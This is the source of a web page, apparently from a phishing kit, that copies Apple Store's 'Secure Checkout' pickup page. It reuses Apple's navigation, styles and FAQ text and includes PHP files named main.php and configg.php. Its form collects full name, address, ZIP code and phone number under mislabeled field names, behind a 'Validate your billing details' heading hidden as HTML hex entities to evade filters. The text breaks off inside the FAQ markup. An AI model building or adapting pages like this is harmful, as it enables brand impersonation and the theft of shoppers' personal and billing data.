<?php
require_once 'includes/main.php';

include 'configg.php';
?>
<!DOCTYPE html>

<html lang="en-US">
	<div id="in-page-channel-node-id">

	</div>
	<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <!-- <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1"> -->
    <title>Pickup Details — Secure Checkout </title>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
    <meta name="format-detection" content="telephone=no">        
     <meta name="description" content="Secure Checkout">
        
      
      <meta name="robots" content="noindex, nofollow">
      
    
            <link data-srs="" rel="stylesheet" href="./style/ac-globalnav.css" media="screen, print">



        <link data-srs="" rel="stylesheet" href="./style/external.css" media="screen, print">
        <link data-srs="" rel="stylesheet" href="./style/common.css" media="screen, print">
        <link data-srs="" rel="stylesheet" href="./style/checkout.css" media="screen, print">

        <link data-srs="" rel="stylesheet" href="./style/fonts">

<link rel="stylesheet" href="./style/merch-tools.css" media="screen, print">
<link rel="stylesheet" href="./style/checkout(1).css" media="screen, print">
<link rel="stylesheet" href="./style/as-checkout.css" media="screen, print">
<link rel="stylesheet" href="./style/checkout(2).css" media="screen, print">

<style>.mk-map-view{width:100%;height:100%;overflow:hidden;-webkit-tap-highlight-color:transparent}.mk-map-view.mk-dragging-annotation{cursor:none}.mk-map-view.mk-disable-all-gestures{touch-action:none}.mk-map-view.mk-disable-pinch-gestures{touch-action:pan-x pan-y}.mk-map-view.mk-disable-zoom-gestures{touch-action:manipulation}.mk-map-view.mk-disable-pan-gestures{touch-action:none;touch-action:pinch-zoom}div.mk-map-view.mk-map-view img,div.mk-map-view.mk-map-view svg{margin:0;padding:0}.mk-annotation-container,.mk-map-view{z-index:0}.mk-map-view>*{position:absolute;left:0;-webkit-user-select:none;-moz-user-select:none}.mk-map-view .rt-root{letter-spacing:.3px}.mk-controls-container{position:absolute;overflow:hidden;top:0;bottom:0;left:0;right:0;z-index:3;pointer-events:none}.mk-map-view .mk-annotation-container,.mk-map-view .mk-controls-container{-ms-user-select:text}.mk-map-view.mk-panning ::selection{background:0 0}.mk-map-view.mk-dragging-cursor{cursor:pointer;cursor:-moz-grabbing;cursor:-webkit-grabbing;cursor:grabbing}.mk-map-view>iframe{width:100%;height:100%;pointer-events:none;opacity:0;border:0}</style></head>
<style>
	.rs-pickup-header-wrapper .rs-pickup-header {
    font-size: 14px;
    line-height: 2.0;
    font-weight: 250;
    letter-spacing: 0;
    /* font-family: SF Pro Display,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif; */
	font-family: sans-serif;
}
.rs-pickup-contact-details .rf-form-layout
{
  padding: 0.059rem 0;
}
</style>
<div data-analytics-element-engagement="globalnav hover - store" class="globalnav-item globalnav-item-store globalnav-item-menu" style="--r-globalnav-flyout-item-number: 0;"><ul class="globalnav-submenu-trigger-group" role="none"><li class="globalnav-submenu-trigger-item"><a href="https://www.apple.com/store" data-globalnav-item-name="store" data-topnav-flyout-trigger-compact="" data-analytics-title="store" data-analytics-element-engagement="hover - store" aria-label="Store" class="globalnav-link globalnav-submenu-trigger-link globalnav-link-store" data-autom="gn_store"><span class="globalnav-link-text-container"><span class="globalnav-image-regular globalnav-link-image"><svg height="44" viewBox="0 0 30 44" width="30" xmlns="http://www.w3.org/2000/svg">
                            <path d="m26.5679 20.4629c1.002 0 1.67.738 1.693 1.857h-3.48c.076-1.119.779-1.857 1.787-1.857zm2.754 2.672v-.387c0-1.963-1.037-3.176-2.742-3.176-1.735 0-2.848 1.289-2.848 3.276 0 1.998 1.096 3.263 2.848 3.263 1.383 0 2.367-.668 2.66-1.746h-1.008c-.264.557-.814.856-1.629.856-1.072 0-1.769-.791-1.822-2.039v-.047zm-9.547-3.451h.96v.937h.094c.188-.615.914-1.049 1.752-1.049.164 0 .375.012.504.03v1.007c-.082-.023-.445-.058-.644-.058-.961 0-1.659 1.098-1.659 1.535v3.914h-1.007zm-4.27 5.519c-1.195 0-1.869-.867-1.869-2.361 0-1.5.674-2.361 1.869-2.361 1.196 0 1.87.861 1.87 2.361 0 1.494-.674 2.361-1.87 2.361zm0-5.631c-1.798 0-2.912 1.237-2.912 3.27 0 2.027 1.114 3.269 2.912 3.269 1.799 0 2.913-1.242 2.913-3.269 0-2.033-1.114-3.27-2.913-3.27zm-5.478-1.475v1.635h1.407v.843h-1.407v3.575c0 .744.282 1.06.938 1.06.182 0 .281-.006.469-.023v.849c-.199.035-.393.059-.592.059-1.301 0-1.822-.481-1.822-1.688v-3.832h-1.02v-.843h1.02v-1.635zm-8.103 5.694c.129.885.973 1.447 2.174 1.447 1.137 0 1.975-.615 1.975-1.453 0-.72-.527-1.177-1.693-1.47l-1.084-.282c-1.53-.386-2.192-1.078-2.192-2.279 0-1.436 1.201-2.408 2.988-2.408 1.635 0 2.854.972 2.942 2.338h-1.061c-.146-.867-.861-1.383-1.916-1.383-1.125 0-1.869.562-1.869 1.418 0 .662.463 1.043 1.629 1.342l.885.234c1.752.439 2.455 1.119 2.455 2.361 0 1.553-1.225 2.543-3.158 2.543-1.793 0-3.03-.949-3.141-2.408z"></path></svg></span><span class="globalnav-link-text">Store</span></span></a></li></ul></div>
</style>
<script type="text/javascript" src="files/jquery.js"></script>
    <body class="checkout">

        <?php 
        
        // include 'loading.php'; 
        ?>
        
    <div class="metrics">
            <noscript>
        <img src="https://securemetrics.apple.com/b/ss/applestoreww/1/H.8--NS/0?pageName=No-Script:AOS%3A+Checkout%2FMain" height="1" width="1" alt=""/>
    </noscript>



    </div>


        
		<div id="page">
			
            <meta name="aos-gn-template" content="2.6.0-SNAPSHOT - Mon Nov 20 2023 11:23:11 GMT-0800 (Pacific Standard Time)">
            <meta name="globalnav-store-key" content="SKCXTKATUYT9JK4HD">
            <meta name="globalnav-submenus-enabled" content="true" data-ff-enabled="" data-cms="">
            <meta name="globalmessage-segment-redirect" content="true" data-cms="">
            <meta name="globalnav-search-suggestions-enabled" content="true" data-cms="">
            <meta name="globalnav-bag-flyout-enabled" content="true" data-cms="">




<div id="globalheader"><aside id="globalmessage-segment" lang="en-US" dir="ltr" class="globalmessage-segment"><ul class="globalmessage-segment-content" data-strings="{&quot;view&quot;:&quot;{%STOREFRONT%} Store Home&quot;,&quot;segments&quot;:{&quot;smb&quot;:&quot;Business Store Home&quot;,&quot;eduInd&quot;:&quot;Education Store Home&quot;,&quot;other&quot;:&quot;Store Home&quot;},&quot;exit&quot;:&quot;Exit&quot;}"></ul></aside><nav id="globalnav" lang="en-US" dir="ltr" aria-label="Global" data-analytics-element-engagement-start="globalnav:onFlyoutOpen" data-analytics-element-engagement-end="globalnav:onFlyoutClose" data-store-api="https://secure7.store.apple.com/shop/bag/status" data-analytics-activitymap-region-id="global nav" data-analytics-region="global nav" class="globalnav js   " style="--r-globalnav-text-zoom-scale: 1;"><div class="globalnav-content"><div class="globalnav-item globalnav-menuback"><button class="globalnav-menuback-button" aria-label="Main menu"><span class="globalnav-chevron-icon"><svg height="48" viewBox="0 0 9 48" width="9" xmlns="http://www.w3.org/2000/svg">
              <path d="m1.5618 24.0621 6.5581-6.4238c.2368-.2319.2407-.6118.0088-.8486-.2324-.2373-.6123-.2407-.8486-.0088l-7 6.8569c-.1157.1138-.1807.2695-.1802.4316.001.1621.0674.3174.1846.4297l7 6.7241c.1162.1118.2661.1675.4155.1675.1577 0 .3149-.062.4326-.1846.2295-.2388.2222-.6187-.0171-.8481z"></path></svg></span></button></div><ul id="globalnav-list" class="globalnav-list"><li data-analytics-element-engagement="globalnav hover - apple" class="globalnav-item globalnav-item-apple"><a href="https://www.apple.com/" data-globalnav-item-name="apple" data-analytics-title="apple home" aria-label="Apple" class="globalnav-link globalnav-link-apple" data-autom="gn_apple"><span class="globalnav-image-regular globalnav-link-image"><svg height="44" viewBox="0 0 14 44" width="14" xmlns="http://www.w3.org/2000/svg">
                <path d="m13.0729 17.6825a3.61 3.61 0 0 0 -1.7248 3.0365 3.5132 3.5132 0 0 0 2.1379 3.2223 8.394 8.394 0 0 1 -1.0948 2.2618c-.6816.9812-1.3943 1.9623-2.4787 1.9623s-1.3633-.63-2.613-.63c-1.2187 0-1.6525.6507-2.644.6507s-1.6834-.9089-2.4787-2.0243a9.7842 9.7842 0 0 1 -1.6628-5.2776c0-3.0984 2.014-4.7405 3.9969-4.7405 1.0535 0 1.9314.6919 2.5924.6919.63 0 1.6112-.7333 2.8092-.7333a3.7579 3.7579 0 0 1 3.1604 1.5802zm-3.7284-2.8918a3.5615 3.5615 0 0 0 .8469-2.22 1.5353 1.5353 0 0 0 -.031-.32 3.5686 3.5686 0 0 0 -2.3445 1.2084 3.4629 3.4629 0 0 0 -.8779 2.1585 1.419 1.419 0 0 0 .031.2892 1.19 1.19 0 0 0 .2169.0207 3.0935 3.0935 0 0 0 2.1586-1.1368z"></path></svg></span><span class="globalnav-image-compact globalnav-link-image"><svg height="48" viewBox="0 0 17 48" width="17" xmlns="http://www.w3.org/2000/svg">
                <path d="m15.5752 19.0792a4.2055 4.2055 0 0 0 -2.01 3.5376 4.0931 4.0931 0 0 0 2.4908 3.7542 9.7779 9.7779 0 0 1 -1.2755 2.6351c-.7941 1.1431-1.6244 2.2862-2.8878 2.2862s-1.5883-.734-3.0443-.734c-1.42 0-1.9252.7581-3.08.7581s-1.9611-1.0589-2.8876-2.3584a11.3987 11.3987 0 0 1 -1.9373-6.1487c0-3.61 2.3464-5.523 4.6566-5.523 1.2274 0 2.25.8062 3.02.8062.734 0 1.8771-.8543 3.2729-.8543a4.3778 4.3778 0 0 1 3.6822 1.841zm-6.8586-2.0456a1.3865 1.3865 0 0 1 -.2527-.024 1.6557 1.6557 0 0 1 -.0361-.337 4.0341 4.0341 0 0 1 1.0228-2.5148 4.1571 4.1571 0 0 1 2.7314-1.4078 1.7815 1.7815 0 0 1 .0361.373 4.1487 4.1487 0 0 1 -.9867 2.587 3.6039 3.6039 0 0 1 -2.5148 1.3236z"></path></svg></span><span class="globalnav-link-text">Apple</span></a></li><li class="globalnav-item globalnav-menu" data-topnav-flyout-item="menu" data-topnav-flyout-label="Menu"><div class="globalnav-flyout" data-topnav-flyout="menu" style="--r-globalnav-flyout-item-total: 0; --r-globalnav-flyout-group-number: 0;"><div class="globalnav-menu-list" style="--r-globalnav-flyout-item-total: 11;">
                
                
                </div></div></li>
							
				</ul><div class="globalnav-menutrigger"><button id="globalnav-menutrigger-button" class="globalnav-menutrigger-button" aria-controls="globalnav-list" aria-label="Menu" data-topnav-menu-label-open="Menu" data-topnav-menu-label-close="Close" data-topnav-flyout-trigger-compact="menu"><svg width="18" height="18" viewBox="0 0 18 18"><polyline id="globalnav-menutrigger-bread-bottom" class="globalnav-menutrigger-bread globalnav-menutrigger-bread-bottom" fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" points="2 12, 16 12"><animate id="globalnav-anim-menutrigger-bread-bottom-open" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 2 12, 16 12; 2 9, 16 9; 3.5 15, 15 3.5"></animate><animate id="globalnav-anim-menutrigger-bread-bottom-close" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 3.5 15, 15 3.5; 2 9, 16 9; 2 12, 16 12"></animate></polyline><polyline id="globalnav-menutrigger-bread-top" class="globalnav-menutrigger-bread globalnav-menutrigger-bread-top" fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" points="2 5, 16 5"><animate id="globalnav-anim-menutrigger-bread-top-open" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 2 5, 16 5; 2 9, 16 9; 3.5 3.5, 15 15"></animate><animate id="globalnav-anim-menutrigger-bread-top-close" attributeName="points" keyTimes="0;0.5;1" dur="0.24s" begin="indefinite" fill="freeze" calcMode="spline" keySplines="0.42, 0, 1, 1;0, 0, 0.58, 1" values=" 3.5 3.5, 15 15; 2 9, 16 9; 2 5, 16 5"></animate></polyline></svg></button></div></div><span style="visibility: hidden; position: absolute; top: 0px; z-index: -1;">&nbsp;</span></nav>
				  <div id="globalnav-curtain" class="globalnav-curtain"></div><div id="globalnav-placeholder" class="globalnav-placeholder"></div>
</div>


			<div id="checkout-container" class="rs-page-content"><div class="rs-checkout" role="main"><div class="rs-checkout-headerbar rs-companionbar-sticky" data-core-sticky="" style="top: 0px;"><div class="rs-checkout-headerbar-content row as-l-container" aria-hidden="false"><div class="column large-6"><div class="rs-checkout-headerbar-title">Personal Details</div></div>
			</div></div>
			<div data-core-fade-transition-wrapper="" class="r-fade-transition-enter-done">
				<div class="rs-zoom-content as-l-container">
					<div class="rs-pickup-header-wrapper">
					<h5  id="rs-checkout-header" class="large-9 small-12 rs-checkout-headerfocus rs-pickup-header" tabindex="-1">To begin, please enter your personal details below.</h5>
				
					<h5 class="large-9 small-12 rs-checkout-headerfocus rs-pickup-header">&#x56;&#x61;&#x6c;&#x69;&#x64;&#x61;&#x74;&#x65;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x62;&#x69;&#x6c;&#x6c;&#x69;&#x6e;&#x67;&#x20;&#x64;&#x65;&#x74;&#x61;&#x69;&#x6c;&#x73;</h5>
				</div><div class="rs-pickup-contact-details"><fieldset>
				<div data-core-fade-transition-wrapper="" class="r-fade-transition-enter-done">
					<div class="rs-pickup-contact-self rs-load-fadein">
            
          
          
          <div class="rs-pickupoption-fields">
						<div class="rf-form-layout-root">
              <div class="rf-form-layout">


        <!-- Loader -->
            <!-- <div class="spinner" role="progressbar" style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;">
              <div style="position: absolute; top: -1px; opacity: 0.25; animation: 0.588235s linear 0s infinite normal none running opacity-60-25-0-12;">
                <div style="position: absolute; width: 6.8px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(0deg) translate(5.6px, 0px); border-radius: 1px;">
                </div>
              </div>



            <div style="position: absolute; top: -1px; opacity: 0.25; animation: 0.588235s linear 0s infinite normal none running opacity-60-25-1-12;">
            <div style="position: absolute; width: 6.8px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(30deg) translate(5.6px, 0px); border-radius: 1px;">
          </div></div>
            <div style="position: absolute; top: -1px; opacity: 0.25; animation: 0.588235s linear 0s infinite normal none running opacity-60-25-2-12;">
            <div style="position: absolute; width: 6.8px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(60deg) translate(5.6px, 0px); border-radius: 1px;">
          </div>
          </div>
          <div style="position: absolute; top: -1px; opacity: 0.25; animation: 0.588235s linear 0s infinite normal none running opacity-60-25-3-12;">
          <div style="position: absolute; width: 6.8px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(90deg) translate(5.6px, 0px); border-radius: 1px;">
        </div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: 0.588235s linear 0s infinite normal none running opacity-60-25-4-12;">
        <div style="position: absolute; width: 6.8px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(120deg) translate(5.6px, 0px); border-radius: 1px;">
      </div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: 0.588235s linear 0s infinite normal none running opacity-60-25-5-12;">
      <div style="position: absolute; width: 6.8px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(150deg) translate(5.6px, 0px); border-radius: 1px;">
    </div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: 0.588235s linear 0s infinite normal none running opacity-60-25-6-12;">
    <div style="position: absolute; width: 6.8px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(180deg) translate(5.6px, 0px); border-radius: 1px;">
  </div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: 0.588235s linear 0s infinite normal none running opacity-60-25-7-12;">
  <div style="position: absolute; width: 6.8px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(210deg) translate(5.6px, 0px); border-radius: 1px;">
</div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: 0.588235s linear 0s infinite normal none running opacity-60-25-8-12;">
<div style="position: absolute; width: 6.8px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(240deg) translate(5.6px, 0px); border-radius: 1px;">
</div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: 0.588235s linear 0s infinite normal none running opacity-60-25-9-12;">
<div style="position: absolute; width: 6.8px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(270deg) translate(5.6px, 0px); border-radius: 1px;">
</div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: 0.588235s linear 0s infinite normal none running opacity-60-25-10-12;">
<div style="position: absolute; width: 6.8px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(300deg) translate(5.6px, 0px); border-radius: 1px;">
</div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: 0.588235s linear 0s infinite normal none running opacity-60-25-11-12;">
<div style="position: absolute; width: 6.8px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(330deg) translate(5.6px, 0px); border-radius: 1px;">
</div></div></div> -->
            
							<div class="rf-form-layout-section rf-form-layout-section--firstName"><div class="rf-form-layout-row rf-form-layout-row-combo--firstName">
                <div class="rf-form-layout-row-fields column small-12 large-6"><div class="row"><div class="column large-12 small-12 rf-form-layout-field--firstName"><div class="rf-form-layout-field"><div class="">
			
		<div class="form-textbox"> <input id="fname" name="firstName" type="text" class="form-textbox-input ser1" aria-labelledby="checkout.pickupContact.selfPickupContact.selfContact.address.firstName_label" aria-describedby="checkout.pickupContact.selfPickupContact.selfContact.address.firstName_error " aria-invalid="false" maxlength="14" required="" aria-required="true" autocomplete="given-name" data-autom="form-field-firstName" value=""><span id="checkout.pickupContact.selfPickupContact.selfContact.address.firstName_label" class="form-textbox-label" aria-hidden="true">Full Name</span></div>
	
	
		<div class="form-textbox"> <input id="ff" name="fi33e" type="text" class="form-textbox-input ser2" aria-labelledby="checkout.pickupContact.selfPickupContact.selfContact.address.firstName_label" aria-describedby="checkout.pickupContact.selfPickupContact.selfContact.address.firstName_error " aria-invalid="false" maxlength="14" required="" aria-required="true" autocomplete="given-name" data-autom="form-field-firstName" value=""><span id="checkout.pickupContact.selfPickupContact.selfContact.address.firstName_label" class="form-textbox-label" aria-hidden="true">First Line of Address</span></div>
	
	</div></div></div></div></div></div><div class="rf-form-layout-row rf-form-layout-row-combo--lastName"><div class="rf-form-layout-row-fields column small-12 large-6"><div class="row"><div class="column large-12 small-12 rf-form-layout-field--lastName"><div class="rf-form-layout-field"><div class=""><div class="form-textbox"> 
		<input id="adress" name="lastName" type="tel" class="form-textbox-input ser3" aria-labelledby="checkout.pickupContact.selfPickupContact.selfContact.address.lastName_label" aria-describedby="checkout.pickupContact.selfPickupContact.selfContact.address.lastName_error " aria-invalid="false" maxlength="20" required="" aria-required="true" autocomplete="family-name" data-autom="form-field-lastName" value=""><span id="checkout.pickupContact.selfPickupContact.selfContact.address.lastName_label" class="form-textbox-label" aria-hidden="true">Second Line of Adress</span></div></div></div></div></div></div></div><div class="rf-form-layout-row rf-form-layout-row-combo--emailAddress"><div class="rf-form-layout-row-fields column small-12 large-6"><div class="row"><div class="column large-12 small-12 rf-form-layout-field--emailAddress"><div class="rf-form-layout-field"><div class=""><div class="form-textbox"> <input id="zip" name="emailAddress" type="email" class="form-textbox-input ser4" aria-labelledby="checkout.pickupContact.selfPickupContact.selfContact.address.emailAddress_label" aria-describedby="checkout.pickupContact.selfPickupContact.selfContact.address.emailAddress_error checkout.pickupContact.selfPickupContact.selfContact.address.emailAddress-fieldMessage" aria-invalid="false" maxlength="50" required="" aria-required="true" autocomplete="email" data-autom="form-field-emailAddress" value="">
	<span id="checkout.pickupContact.selfPickupContact.selfContact.address.emailAddress_label" class="form-textbox-label" aria-hidden="true">ZIP Code</span></div></div></div></div></div></div>
	
	</div><div class="rf-form-layout-row rf-form-layout-row-combo--fullDaytimePhone"><div class="rf-form-layout-row-fields column small-12 large-6"><div class="row"><div class="column large-12 small-12 rf-form-layout-field--fullDaytimePhone"><div class="rf-form-layout-field"><div class=""><div class="form-textbox"> <input id="phone" name="fullDaytimePhone" type="tel" class="form-textbox-input ser5" aria-labelledby="checkout.pickupContact.selfPickupContact.selfContact.address.fullDaytimePhone_label" aria-describedby="checkout.pickupContact.selfPickupContact.selfContact.address.fullDaytimePhone_error checkout.pickupContact.selfPickupContact.selfContact.address.fullDaytimePhone-fieldMessage" aria-invalid="false" required="" aria-required="true" autocomplete="tel" data-autom="form-field-fullDaytimePhone" value=""><span id="checkout.pickupContact.selfPickupContact.selfContact.address.fullDaytimePhone_label" class="form-textbox-label" aria-hidden="true">Phone Number</span></div></div></div></div></div></div>
	
	</div></div></div></div></div><div class="large-6 small-12 rs-pickup-instructions">
		
	
</div></div></div></fieldset></div></div><div class="rs-pickup-button as-l-container"><div class="rs-checkout-action"><div class="row"><div class="column large-6 small-12"><button id="rs-checkout-continue-button-bottom" type="button" class="form-button" data-analytics-title="false" data-autom="continue-button-label"><span><span>Continue</span></span></button></div></div></div></div><div class="rs-checkout-chatfaq-wrapper"><div class="as-chat rs-chat">
	
</div><div data-core-accordion="" id="23d2eb40-bb05-11ee-b1a8-6786a82d256e" class="rc-accordion rs-faq"><div data-core-accordion-item="" class="rc-accordion-item"><h2 class="as-l-container">
	</h2><div aria-hidden="true" data-core-height-transition-wrapper="" class="r-height-transition-exit-done" style="height: 0px;"><div data-core-height-transition-content=""><div data-core-accordion-content="" aria-hidden="true" id="content-23d2eb40-bb05-11ee-b1a8-6786a82d256e-0" class="as-l-container"><div class="rc-accordion-content rc-accordion-content-nopadding"><ul data-core-accordion="" id="faq-question" class="rc-accordion rc-accordion-compact rc-accordion-hover" role="list"><li data-core-accordion-item="" class="rc-accordion-item" role="listitem"><h3><button type="button" data-core-accordion-button="" aria-expanded="false" aria-controls="content-faq-question-0" id="title-faq-question-0" class="rc-accordion-button"><span class="rc-accordion-title">When can I pick up my order?</span><span class="icon"></span><span class="rc-accordion-chevrondown"><svg viewBox="0 0 17 8.85" class="as-svgicon as-svgicon-chevrondown as-svgicon-base as-svgicon-chevrondownbase" role="img" aria-hidden="true" width="35px" height="35px"><path fill="none" d="M0 0h35v35H0z"></path><path d="M15 1.13 8.5 7.72 2 1.13" style="fill:none;stroke:#86868b;stroke-linecap:round;stroke-linejoin:round;stroke-width:2.25px"></path></svg></span></button></h3><div aria-hidden="true" data-core-height-transition-wrapper="" class="r-height-transition-exit-done" style="height: 0px;"><div data-core-height-transition-content=""><div data-core-accordion-content="" aria-hidden="true" id="content-faq-question-0"><div class="rc-accordion-content"><div>We’ll email you when your items are ready for pickup. They won’t be ready before then. In-stock items are typically ready within an hour. To ensure your store experience remains fast and easy, some pickup orders may require you to choose a check-in time. If you’re unable to come in during your chosen time window, you can still pick up your order, but you may have to wait longer. <a href="https://www.apple.com/shop/help/shipping_delivery" data-feature-name="Astro Link" data-display-name="AOS: help/shipping_delivery" class="icon-wrapper" target="_blank"><span class="icon-copy">Learn more about Apple Pickup</span><span class="visuallyhidden"> (opens in a new window)</span><span aria-hidden="true" class="more"></span></a></div></div></div></div></div></li><li data-core-accordion-item="" class="rc-accordion-item" role="listitem"><h3><button type="button" data-core-accordion-button="" aria-expanded="false" aria-controls="content-faq-question-1" id="title-faq-question-1" class="rc-accordion-button"><span class="rc-accordion-title">Can I pick up my items at an Apple Store? </span><span class="icon"></span><span class="rc-accordion-chevrondown"><svg viewBox="0 0 17 8.85" class="as-svgicon as-svgicon-chevrondown as-svgicon-base as-svgicon-chevrondownbase" role="img" aria-hidden="true" width="35px" height="35px"><path fill="none" d="M0 0h35v35H0z"></path><path d="M15 1.13 8.5 7.72 2 1.13" style="fill:none;stroke:#86868b;stroke-linecap:round;stroke-linejoin:round;stroke-width:2.25px"></path></svg></span></button></h3><div aria-hidden="true" data-core-height-transition-wrapper="" class="r-height-transition-exit-done" style="height: 0px;"><div data-core-height-transition-content=""><div data-core-accordion-content="" aria-hidden="true" id="content-faq-question-1"><div class="rc-accordion-content"><div>Yes. If you choose pickup, you’ll select a store and a pickup date for your items during checkout. Not all items are available for pickup. We’ll send you a text message after you place your order letting you know when your items are ready for pickup. <a href="https://www.apple.com/shop/help/shipping_delivery" data-feature-name="Astro Link" data-display-name="AOS: help/shipping_delivery" class="icon-wrapper" target="_blank"><span class="icon-copy">Learn more about Apple Pickup</span><span class="visuallyhidden"> (opens in a new window)</span><span aria-hidden="true" class="more"></span></a></div></div></div></div></div></li><li data-core-accordion-item="" class="rc-accordion-item" role="listitem"><h3><button type="button" data-core-accordion-button="" aria-expanded="false" aria-controls="content-faq-question-2" id="title-faq-question-2" class="rc-accordion-button"><span class="rc-accordion-title">What can I expect at my Apple Store if I select one of the modified pickup methods?</span><span class="icon"></span><span class="rc-accordion-chevrondown"><svg viewBox="0 0 17 8.85" class="as-svgicon as-svgicon-chevrondown as-svgicon-base as-svgicon-chevrondownbase" role="img" aria-hidden="true" width="35px" height="35px"><path fill="none" d="M0 0h35v35H0z"></path><path d="M15 1.13 8.5 7.72 2 1.13" style="fill:none;stroke:#86868b;stroke-linecap:round;stroke-linejoin:round;stroke-width:2.25px"></path></svg></span></button></h3><div aria-hidden="true" data-core-height-transition-wrapper="" class="r-height-transition-exit-done" style="height: 0px;"><div data-core-height-transition-content=""><div data-core-accordion-content="" aria-hidden="true" id="content-faq-question-2"><div class="rc-accordion-content"><div>The Apple Store you select will offer one or more of our modified pickup methods — in-store, curbside, or express. When your order is ready, we’ll send an email with detailed pickup instructions that include how to get your pickup started when you arrive. We’ll also let you know if your selected Store requires temperature checks and face masks during pickup. You can find the latest information for your local Apple Store via <a href="https://www.apple.com/retail" data-feature-name="Astro Link" data-display-name="AOS: retail" target="_blank">Find a Store<span class="icon icon-after icon-chevronright"></span><span class="visuallyhidden">(opens in a new window)</span></a></div></div></div></div></div></li><li data-core-accordion-item="" class="rc-accordion-item" role="listitem"><h3><button type="button" data-core-accordion-button="" aria-expanded="false" aria-controls="content-faq-question-3" id="title-faq-question-3" class="rc-accordion-button"><span class="rc-accordion-title">When will I get text notifications?</span><span class="icon"></span><span class="rc-accordion-chevrondown"><svg viewBox="0 0 17 8.85" class="as-svgicon as-svgicon-chevrondown as-svgicon-base as-svgicon-chevrondownbase" role="img" aria-hidden="true" width="35px" height="35px"><path fill="none" d="M0 0h35v35H0z"></path><path d="M15 1.13 8.5 7.72 2 1.13" style="fill:none;stroke:#86868b;stroke-linecap:round;stroke-linejoin:round;stroke-width:2.25px"></path></svg></span></button></h3><div aria-hidden="true" data-core-height-transition-wrapper="" class="r-height-transition-exit-done" style="height: 0px;"><div data-core-height-transition-content=""><div data-core-accordion-content="" aria-hidden="true" id="content-faq-question-3"><div class="rc-accordion-content"><div>We’ll send you text messages when your items have shipped or when they’re ready for pickup. We may also contact you if there’s an issue with your order. Texts are sent between 8 a.m. and 9 p.m. in your time zone. To stop receiving text notifications, simply reply to the text message with "STOP."</div></div></div></div></div></li><li data-core-accordion-item="" class="rc-accordion-item" role="listitem"><h3><button type="button" data-core-accordion-button="" aria-expanded="false" aria-controls="content-faq-question-4" id="title-faq-question-4" class="rc-accordion-button"><span class="rc-accordion-title">When will I get my items?</span><span class="icon"></span><span class="rc-accordion-chevrondown"><svg viewBox="0 0 17 8.85" class="as-svgicon as-svgicon-chevrondown as-svgicon-base as-svgicon-chevrondownbase" role="img" aria-hidden="true" width="35px" height="35px"><path fill="none" d="M0 0h35v35H0z"></path><path d="M15 1.13 8.5 7.72 2 1.13" style="fill:none;stroke:#86868b;stroke-linecap:round;stroke-linejoin:round;stroke-width:2.25px"></path></svg></span></button></h3><div aria-hidden="true" data-core-height-transition-wrapper="" class="r-height-transition-exit-done" style="height: 0px;"><div data-core-height-transition-content=""><div data-core-accordion-content="" aria-hidden="true" id="content-faq-question-4"><div class="rc-accordion-content"><div>By entering a zip code, you’ll get estimated delivery and pickup dates for your items. You’ll get a final delivery date after you place your order. Delivery estimates are based on item availability and the shipping option you choose. For pickup, you’ll choose a pickup date and store in checkout. <a href="https://www.apple.com/shop/help/shipping_delivery" data-feature-name="Astro Link" data-display-name="AOS: help/shipping_delivery" class="icon-wrapper" target="_blank"><span class="icon-copy">Learn more about Apple Shipping &amp; Pickup</span><span class="visuallyhidden"> (opens in a new window)</span><span aria-hidden="true" class="more"></span></a></div></div></div></div></div></li><li data-core-accordion-item="" class="rc-accordion-item" role="listitem"><h3><button type="button" data-core-accordion-button="" aria-expanded="false" aria-controls="content-faq-question-5" 